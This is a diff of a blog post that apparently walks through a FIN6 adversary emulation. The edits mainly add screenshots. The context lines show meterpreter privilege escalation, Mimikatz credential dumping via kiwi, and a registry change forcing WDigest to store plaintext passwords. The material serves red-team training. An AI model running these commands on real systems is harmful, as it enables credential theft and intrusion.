@@ -286,6 +286,7 @@ Next, the command below assumes a meterpreter session and specifies the use of t
 ```bash
 meterpreter > getsystem -t 1
 ```
+
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_1_Meterpreter_Named_Pipe_Imp.png){:width="100%"}
 
 ### 3.2 - OS Credential Dumping: LSASS Memory [**T1003.001**](https://attack.mitre.org/techniques/T1003/001/)
@@ -296,6 +297,7 @@ Reporting indicates that FIN6 has used Mimikatz on several occasions. While ther
 meterpreter > load kiwi
 meterpreter > creds_all
 ```
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz_No_Password.png){:width="100%"}
 
 Note the password field is null.
 
@@ -303,12 +305,13 @@ As part of WDigest authentication provider, Windows versions up to 8 and 2012 us
 
 Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:
 
-```Powershell
+```ps
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 ```
 
-Once done, restart the victim's server and re-execute the Mimikatz command earlier.
+Once done, restart the victim's server and re-execute the Mimikatz command earlier. You should now able to see the clear-text passwords in memory. 
 
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz.png){:width="100%"}
 
 FIN6
 
